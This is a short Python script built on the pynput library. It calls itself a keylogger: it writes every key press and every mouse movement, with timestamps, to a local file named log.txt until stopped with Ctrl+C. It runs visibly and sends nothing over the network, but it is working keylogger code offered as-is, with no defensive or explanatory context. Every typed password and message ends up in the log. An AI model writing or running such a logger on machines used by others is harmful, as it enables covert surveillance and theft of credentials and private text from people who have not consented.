from pynput import keyboard, mouse
import logging

# Set up logging to file
logging.basicConfig(filename="log.txt", level=logging.INFO, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Key pressed: {key}")

def on_move(x, y):
    logging.info(f"Mouse moved to: {(x, y)}")

# Setup listeners
# We use 'with' statements to ensure listeners are properly cleaned up
# This syntax allows both to run simultaneously
print("Starting KeyLogger... Press Ctrl+C to stop.")
with mouse.Listener(on_move=on_move) as m_listener:
    with keyboard.Listener(on_press=on_press) as k_listener:
        # Join the listeners to the main thread to keep the script running
        m_listener.join()
        k_listener.join()
